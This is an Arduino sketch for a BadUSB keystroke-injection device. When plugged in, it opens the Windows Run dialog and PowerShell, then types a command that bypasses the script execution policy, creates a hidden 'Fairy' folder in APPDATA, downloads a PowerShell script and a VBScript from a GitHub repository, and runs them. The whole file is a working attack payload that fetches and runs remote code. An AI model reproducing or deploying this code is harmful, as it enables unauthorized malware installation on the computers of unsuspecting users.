#include <Keyboard.h>

char windowsKey = KEY_LEFT_GUI;

void setup() {
  Keyboard.begin();
  //////////// PAYLOAD START ////////////

  delay(5000);  

  // win+r 
  Keyboard.press(windowsKey);
  Keyboard.press('r');
  Keyboard.releaseAll();
  
  delay(5000);

  // enter powershell command
  Keyboard.println("powershell");

  delay(5000);

  // enter deploy command
  Keyboard.println("powershell.exe -Command {Set-ExecutionPolicy Bypass -Scope Process -Force; New-Item $env:APPDATA -Name \"Fairy\" -ItemType \"Directory\" -Force; Set-Location -Path \"$($env:APPDATA)\\Fairy\"; Invoke-WebRequest -Uri https://raw.githubusercontent.com/h3xagon0001/arduino-micro-badusb/refs/heads/main/download.ps1 -OutFile download.ps1; Invoke-WebRequest -Uri https://raw.githubusercontent.com/h3xagon0001/arduino-micro-badusb/refs/heads/main/download.vbs -OutFile download.vbs; ./download.vbs}; exit");
  //////////// PAYLOAD END ////////////
  Keyboard.end();
}

void loop() {
  // put your main code here, to run repeatedly:

}
